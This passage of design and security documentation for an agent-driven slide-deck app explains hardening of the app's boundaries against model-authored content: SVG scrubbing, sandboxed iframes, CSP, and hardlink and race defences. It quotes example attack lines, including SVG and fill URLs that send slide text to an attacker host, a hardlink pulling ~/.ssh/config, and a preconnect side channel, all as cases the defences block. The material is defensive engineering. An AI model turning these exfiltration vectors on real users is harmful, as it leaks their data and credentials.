  resolves the DESCRIPTOR's real path (`/proc/self/fd` on Linux, `F_GETPATH` on
  macOS), requiring it inside `within_root`, so the inode validated is the inode
  read and no check-to-use window remains (its documented R33 F1 case). It also
  rejects hardlinks and non-regular files, and fails closed when the fd's path
  cannot be determined. The root comes from a separate `resolve_deck_dir` call, never
  from `resolved.parent` — a root derived from the path under attack would validate
  the escape against itself. Oversize RAISES `FileTooLargeError` here (rather than
  returning `None`), which is caught and mapped to the same "not servable" answer.
  Pinned by `::test_an_intermediate_directory_swapped_after_resolution_is_refused`.

  **`GET /style` goes through the same helper.** A style is easy to misfile as inert
  user upload, because a user CAN import one by hand (`POST /styles/import`) — but
  the `sdpm-style` agent's entire purpose is to WRITE one, and it holds `web_fetch` /
  `web_search`, so the boundary has to assume the untrusted author. It reuses
  `_redact_artifact` rather than a bare `redact()` for the raster reason above: a
  style embeds the same inline art, so an unguarded pass would blank the preview.
  Pinned by `test_pptx_maker_routes.py::test_style_html_is_redacted` and
  `::test_style_html_keeps_its_inline_art`.
- **`bgFill` is guarded separately, because it never enters the walk.** Every
  payload fragment goes through `setSvgFragment` → `scrubExternalRefs`, but the
  slide's background colour is applied straight onto a `<rect>` — and a `fill`
  accepts a FuncIRI, so an agent-authored `url(https://attacker/?d=…)` there was a
  live GET on the dashboard's own origin, bypassing all of the above. It now passes
  through the same `urlRefsAreLocal` rule and falls back to `transparent` when
  rejected, so a same-document `url(#brandGradient)` still works (the deck's
  gradients live in the shared `defs`) while anything off-origin does not. `viewBox`
  is the only other direct payload write and takes numbers, not references. Pinned
  by `SlidePreviewSanitize.test.tsx` § "bgFill URL guard".
- **Sandboxed board rendering.** Style and art-direction documents are
  author-controlled HTML. The frontend renders them via `srcDoc` in an iframe with
  an EMPTY `sandbox` attribute — no `allow-scripts`, no `allow-same-origin`, so a
  null origin with no script execution — and `pointer-events: none`.
  `prepareBoardHtml` prepends an egress-denying CSP (`default-src 'none'` with only
  `img-src data:` / `style-src 'unsafe-inline'` / `font-src data:` granted) ahead of
  every model byte, never spliced before `</head>`: a policy emitted after the
  markup it governs does not govern it.
  Two deliberate, and opposite, decisions sit on top of that policy:
  - **`<link>` elements are STRIPPED**, because they are the one egress the CSP
    cannot deny. `rel="preconnect"` is not a fetch, so no fetch directive governs it
    — structural, and confirmed by measurement: neither `connect-src 'none'` nor
    `prefetch-src 'none'` stops it. At least WebKit opens a real TCP connection per
    distinct host; Chromium and Firefox did not when measured, but speculative
    loading is exactly what a browser release enables, so the control deliberately
    does not depend on which engines currently do.
    A board naming a bank of attacker-chosen hosts is therefore a script-free side
    channel that encodes deck content in *which* hosts it dials. Removing the
    element is the only mechanism that closes it, and nothing is lost: the CSP
    already refuses every `rel` that fetches. Matches the Meetings sketch frame,
    which strips `<link>` from its own srcdoc.
  - **`<meta http-equiv="refresh">` is deliberately NOT stripped.** Its navigation
    is gated on the *sandboxed automatic features* flag, which an empty `sandbox`
    sets because no `allow-scripts` is granted (WHATWG HTML, shared declarative
    refresh steps) — verified refused in Chromium, Firefox and WebKit, with the CSP
    removed entirely. A strip would be dead code, and would obscure the real
    invariant: **these frames must never gain `allow-scripts`**, which is what makes
    the un-stripped refresh safe. `PptxMakerPage.test.tsx` asserts `sandbox=""` on
    both frames to pin exactly that.
- **Agent-authored SVG: no off-origin references (the slide preview's boundary).**
  The compose payload — per-component fragments, `bgSvg`, and the deck's shared
  `defs` — is written by a model driving the engine, and unlike a style board it
  renders in the LIVE dashboard DOM on the dashboard's own origin, not in a
  null-origin frame. `setSvgFragment` in `SlidePreview.tsx` is the single path a
  fragment becomes DOM (`defs` included), and it applies two passes:
  1. **DOMPurify in SVG mode** (`USE_PROFILES: {svg, svgFilters}`) strips
     `<script>`, `on*` handlers, `<foreignObject>` and `javascript:` URLs.
  2. **An off-origin reference scrub** over the still-detached subtree. DOMPurify
     is an XSS filter, not an egress filter: it deliberately KEEPS `<image href>`,
     `<feImage href>`, `xlink:href` and the FuncIRI presentation attributes
     (`fill`, `stroke`, `clip-path`, `mask`, `filter`, `marker-*`), because a
     passive cross-origin GET is not script execution. The dashboard CSP allows
     `img-src … https:`, so there is no backstop — an agent-authored
     `<image href="https://attacker.example/?d=…">` would exfiltrate the slide's
     text in a query string. **The invariant: a URL reference in agent-authored
     SVG may only be a bare same-document `#fragment`.** Absolute,
     protocol-relative (`//host/x`), scheme-relative and root-relative values are
     removed. The rule is an allow-list, so a URL-bearing attribute nobody
     enumerated still fails closed, and CSS-escaped (`\75 rl(…)`) or unclosed
     `url(` values are treated as hostile. Inline `<style>` elements are dropped
     outright — `@import` and `@font-face src` fetch without any `url(` token to
     match on, and the engine composes with presentation attributes only.
  **Fragment refs MUST keep working**, and are equally load-bearing: the deck's
  shared gradients and symbols live in the separate `defs` payload and every slide
  reaches them by id, so `fill="url(#grad)"` and `href="#symbolId"` survive
  untouched. The ONE non-fragment exemption is an inline `data:image/<bitmap>` on
  `<image>`: the engine's compose step re-encodes all embedded raster art as
  `data:image/webp;base64,…`, so refusing it would blank every photo in every deck
  — and inline bytes issue no request, so they cannot carry deck text anywhere.
  `image/svg+xml` is excluded even there, and `data:` is refused on every other
  element. Pinned by `website/src/test/SlidePreviewSanitize.test.tsx`, whose
  attack-vector cases (`<image href>`, `xlink:href`, protocol-relative, `<feImage>`,
  every FuncIRI attribute, gradient/pattern/`textPath`/`tref` refs, `style`
  attributes, inline `<style>`, CSS escapes, nesting) are each verified to FAIL
  without the scrub, alongside false-negative guards that pin the surviving
  fragment refs and inline bitmaps.
- **Nothing blocking on the event loop.** Every filesystem walk, engine
  subprocess and file read runs through `routes.off_loop`, which hands the work to
  `subprocess_executor()`. The engine is a `subprocess.run` and the deck root is a
  user-sized tree; one blocking call here would freeze every chat session on the
  gateway (AUTOSDE `no-blocking-call-on-event-loop`).
- **Spawn hardening.** Every engine and `uv` invocation goes through
  `sandboxed_spawn_argv` + `cgroup_scope_argv` + `resource_limit_preexec` — the
  same OS sandbox, credential-scrubbed environment and resource ceiling the rest of
  the codebase applies. Argv is fixed; the only variable parts are the resolved
  `uv` path and paths already contained by `paths.py`. `PYTHONPATH` is cleared so
  the engine venv's pinned native dependencies win. `argv[0]` is always absolute,
  so nothing depends on the scrubbed env's `PATH`.
- **Verified third-party bytes.** The engine tarball is sha256-pinned and verified
  over the download STREAM before extraction, and extracted with every archive
  member validated (no traversal, no absolute names, regular files and dirs only,
  bounded size). See Provisioning → Safe extraction.
- **Bounded uploads.** Style ≤ 4 MB, template ≤ 64 MB, read in chunks rather than
  by trusting `Content-Length`. A `.pptx` must start with the zip magic and a
  style must contain markup, so a mislabelled upload is refused before it reaches
  the engine's analyzer.
- **Deny-by-default.** All handlers wrapped in `_require_enabled`; the gate runs
  BEFORE the handler body, so a disabled app does not even walk the deck tree.
- **SEL audit.** Every mutating action (engine/asset provisioning, deck-root
  writes, library import/rename/delete) and every refused artifact read emits an
  SEL `pptx_maker.*` event.
- **Config narrowness.** `PUT /config` requires exact key equality on
  `{"deckRoot"}` rather than merging, so a browser request cannot set an arbitrary
  engine option. Other keys already in the engine's config are preserved; a
  corrupt engine config is a 409, not an overwrite.
- **Deck-tree reads are pinned to the opened inode too, via one shared reader.**
  `decks._read_deck_text` is the single path by which this module reads `deck.json`,
  `specs/brief.md` and `specs/outline.md`, and it goes through
  `hooks.safe_read_file_bytes_nolink` with the deck dir as `within_root`. Same hardlink
  reasoning as the library reads below — `contained_deck_file` stops a symlink but
  cannot see a hardlink — so `os.link("~/.ssh/config", "specs/brief.md")` previewed SSH
  configuration onto the Deck list, which every visit to the app loads. Centralized
  rather than fixed per reader **because the per-reader approach demonstrably failed**:
  this defect was reported three times in this module, each time one reader over from
  the previous fix. A fourth reader now cannot reintroduce it. A hostile deck degrades
  to its directory name with an empty brief; honest decks are unaffected. Pinned by
  `test_pptx_maker_decks.py::test_hardlinked_deck_files_are_not_read`.
- **Library reads are pinned to the opened inode, because a HARDLINK defeats every
  path check.** `resolve_library_file` resolves and re-checks containment, which stops
  a symlink — but a hardlink has no target to resolve: `is_symlink()` is False and
  `resolve()` returns the path itself, so a path-based gate cannot see it. The styles
  dir is agent-writable, so `os.link("~/.ssh/config", "styles/pwned.html")` made
  `GET /styles` and `GET /style` serve SSH configuration to the dashboard. Both read
  paths (`list_styles`' cover extraction and `style_html`) now go through
  `hooks.safe_read_file_bytes_nolink` with the matched style dir as `within_root`,
  which rejects `st_nlink > 1` on the OPENED descriptor (its documented R30 F1 case)
  along with non-regular files and any fd whose real path escapes the root. The root
  is the dir the lookup MATCHED, never `path.parent` — a parent taken from the path
  under attack would validate the escape against itself. Pinned by
  `test_pptx_maker_library.py::TestStyleReadsRejectHardlinks`, which also pins that an
  ordinary style still reads.
- **SEL audit fields are redacted at the chokepoint.** `_audit` runs `redact` over
  both free-text fields. Every call site interpolates a user- or agent-chosen value —
  a style/template name, a deck root, a `deckId/subpath`, an exception string — and an
  `AKIA`-shaped name is legal under `SEGMENT_RE`, so the credential was written
  verbatim into the SEL and served back by `GET /api/sel/events`. An audit log is a
  user-facing surface, and a *durable* one: unlike a response body, a leak there
  persists. Redaction is centralized in `_audit` rather than repeated at each call
  site, so a future caller cannot omit it, and it runs BEFORE the 200-char truncation
  — truncating first can slice a credential so neither fragment matches a pattern.
  Pinned by `test_pptx_maker_routes.py::TestAuditRedaction`.
- **Every `state.json` read-modify-write is serialized under `_STATE_LOCK`.**
  `library.state_transaction()` is the shared lock, and the rule is that a caller
  spanning a read AND a write takes it once around the whole sequence. Two callers
  are read-modify-write even though they look like pure analysis, because their
  engine snippets do `get_state()` → mutate `template_metadata` → `update_state(...)`
  in a subprocess: `library.import_template` (via `engine.analyze_template`) and
  `provision` (via `engine.scan_new_templates`). Left unlocked, two concurrent
  imports — or an import overlapping background provisioning — each read the map
  before either wrote it, so the second write silently dropped the other template's
  metadata while both reported success. This is the same lost-update shape the
  `O_EXCL` name claim fixes for the template FILE, one level up at the shared
  metadata document. Holding the lock across the subprocess is safe because these
  paths are already `BLOCKING` and run via `off_loop`; the cost is that concurrent
  template imports serialize, which is the intended trade for a rare user action.
  Pinned by `test_pptx_maker_library.py::test_the_analysis_runs_under_the_state_lock`.
  **The rename verbs hold it across the file MOVE as well**, not just the state write.
  Split, a concurrent delete of the new name interleaved between the `os.link` and the
  state update, leaving `state.json` naming a file that no longer existed while both
  verbs answered 200. The move is what makes the state stale, so it belongs inside the
  same critical section — which is what `delete_style`/`delete_template` already did.
  `os.link` is kept under the lock rather than replaced: a process-local lock cannot
  arbitrate against anything else sharing the library directory, and the atomic
  `FileExistsError` still supplies the 409. Pinned by
  `::test_the_rename_move_runs_under_the_state_lock`.
- **The deck root is validated where it is WRITTEN, not only where it is read.**
  `_write_deck_root` refuses a value that `is_sensitive_path` or
  `path_contains_sensitive` rejects. This is a write-side control on purpose: the
  persisted value is the ENGINE's `output_dir`, and the engine resolves it
  independently of `paths.deck_root()` — it `mkdir(parents=True)`s the tree and
  writes `deck.json` / `specs/` / `slides/` beneath it. A `deckRoot` of `~/.ssh`
  therefore does not merely expose a credential directory, it makes a third-party
  tree driven by model-authored deck content create files inside one (and mint the
  directory at `0o755` where it did not exist). The per-deck `paths._contained`
  gate is **not** a substitute: it refuses to *display* anything under a sensitive
  root, so the writes would land while `GET /decks` reported an empty list. Both
  predicates are required — `is_sensitive_path` covers the directory and its
  descendants, `path_contains_sensitive` covers a root (bare `~`) that would make
  every deck a sibling of `.ssh`/`.aws`.
- **An embedded NUL is refused by an EXPLICIT check on the raw string**, not by
  catching `Path.resolve()`. `resolve()` raises `ValueError` for a NUL on POSIX,
  but on Windows `ntpath` does the work in pure Python and never reaches the OS
  for a non-existent path, so it returns successfully — the `try/except` alone let
  the value through and `iterdir`/`mkdir` were the first calls to raise, one layer
  past the refusal. Accepting it wedges the app: the endpoint answers 200 and every
  later `GET /config` and deck route 500s out of `deck_root()`, including the
  settings page needed to correct it. The check is on the raw string because
  expansion can neither introduce nor remove a NUL. Pinned by
  `test_pptx_maker_routes.py::TestConfigRoutes::test_put_refuses_a_path_that_cannot_be_resolved`.

## Frontend

`website/src/apps/pptx-maker/`, registered at `/pptx-maker` in
`builtinRegistry.ts`. Standard page layout (`PageHeader` + `px-6 pb-8` container +
StatCard row + `Card`/`CardTitle`), three views behind a `SegmentedControl`:
Decks, Library, Settings. i18n keys under `apps.pptxMaker.*` in all 10 catalogs.

| File | Role |
|------|------|
| `PptxMakerPage.tsx` | Shell: stat row, engine banner, deck list, view switching, per-mode chat launch |
| `DeckViewer.tsx` | Tabbed deliverable viewer (Brief / Outline / Art direction / Slides) |
| `SlidePreview.tsx` | Assembles a compose payload into SVG, fading in only what changed |
| `BoardFrame.tsx` | Sandboxed scaled iframe for style / art-direction documents (+ `BoardThumb`) |
| `LibraryPanel.tsx` | Style and template library CRUD |
| `api.ts` | Typed client; `artifactUrl()` is the one place a relative artifact path becomes a request |
| `lib.ts` | Pure helpers — deck filter, tab-follow rule, board scaling, filename sanitising |

**The tab-follow rule is the page's defining behaviour.** `tabToFollow` compares
two successive `updatedAt` maps and switches to the newest changed deliverable, so
a user watching the panel sees the brief, then the outline, then the art
direction, then the slides, without clicking. It returns `null` on the FIRST poll
— otherwise opening a finished deck would yank the user to whatever was last
touched days ago.

`SlidePreview` animates only on a RECOMPOSE (the compose URL's epoch moved) and
only the components the engine marked `changed`, so opening a finished deck does
not look like it is being rebuilt. `prefers-reduced-motion` renders the final
state immediately.

## Tests

Backend, in the repo-level `test/` tree as `test_pptx_maker_*.py` (457 tests —
`setup.cfg` sets `testpaths = test transfer`, so a test under
`src/kiro_crew/apps/builtins/...` would never be collected by CI):
`..._paths.py` (segment grammar, traversal, symlink escape, deck-root
resolution), `..._decks.py` (in-progress decks listed, newest compose epoch wins,
outline-driven slide order, relative URLs only), `..._library.py` (validation
ladder, collision refusal, pin/metadata bookkeeping across rename and delete),
`..._routes.py` (deny-by-default on every route, served-extension allow-list,
CSP header, artifact redaction — an `AKIA`-shaped credential in a served
`.json`/`.md`/`.svg`/`.html` comes back redacted, a `.pptx`/`.png` comes back
byte-identical, inline raster art survives, an undecodable byte sequence does not
raise — `PUT /config` key equality, no `/deps/install`), `..._engine.py`
(readiness probes, marker-derived tag, snippet spawning),
`..._provision.py` (the `uv` resolver's four legs incl. the frozen-bundle one, the
credential-scrubbing spawn, provisioning's failure ladder),
`..._engine_source.py` (digest refusal, URL-override scheme check, tar traversal /
symlink / device / bomb refusal on BOTH the 3.11+ and the 3.10 extraction leg,
source-marker honesty, previous-tree preservation), and `..._preview_tools.py`
(the shim's poppler-compatible output naming and sizing flags against REAL PDFs,
its refuse-rather-than-mis-render behavior, and the launcher's install —
executable, not group-writable, idempotent, refused before the engine venv exists,
and runnable from a data-home path containing `$`/backtick/quote/space, which
plain double-quoting corrupted). No real subprocess is ever spawned against the
engine and no test reaches the network.

Frontend: `website/src/test/PptxMakerPage.test.tsx` (46 tests) — the pure helpers
plus the page against a mocked API (layout contract, engine banner states, deck
selection, library and settings views). `SlidePreviewSanitize.test.tsx` (21 tests)
is deliberately a SECOND file — `PptxMakerPage.test.tsx` mocks both
`pptx-maker/api` and `SlidePreview`'s default export, so importing the real
`setSvgFragment` there re-enters the hoisted api mock. It covers the XSS boundary
(script / `on*` / `foreignObject` / `javascript:`), the off-origin reference
invariant above, and — just as load-bearing — that legitimate markup, same-document
fragment refs and inline bitmaps SURVIVE. Both failure directions render every
slide blank or wrong while looking secure, so each is pinned explicitly.

One test drives `scrubExternalRefs` directly rather than through
`setSvgFragment`: DOMPurify's SVG profile allows `style` as a tag, but the test
DOM's HTML parser discards `svg > style` and every sibling after it when parsing a
STRING, so a string-driven version of that case would pass even with the scrub
removed. It is exported for that reason alone — `setSvgFragment` remains the only
path a fragment becomes DOM.
